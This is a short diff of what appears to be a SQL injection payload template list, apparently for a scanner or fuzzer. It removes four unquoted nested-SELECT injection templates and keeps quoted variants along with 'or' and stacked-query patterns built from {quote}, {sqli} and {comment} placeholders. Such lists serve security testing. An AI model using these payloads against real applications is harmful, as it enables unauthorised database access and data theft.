@@ -15,10 +15,6 @@
 {quote}));{sqli}{comment}
 {quote}) or {sqli}{comment}
 {quote})) or {sqli}{comment}
-AND (SELECT * FROM (SELECT({sqli}))bAKL) AND {quote}vRxe{quote}={quote}vRxe
-AND (SELECT * FROM (SELECT({sqli}))YjoC) AND {quote}%{quote}={quote}
-AND (SELECT * FROM (SELECT({sqli}))nQIP)
-AND (SELECT * FROM (SELECT({sqli}))nQIP){comment}
 {quote} AND (SELECT * FROM (SELECT({sqli}))bAKL) AND {quote}vRxe{quote}={quote}vRxe
 {quote} AND (SELECT * FROM (SELECT({sqli}))YjoC) AND {quote}%{quote}={quote}
 {quote} AND (SELECT * FROM (SELECT({sqli}))nQIP)
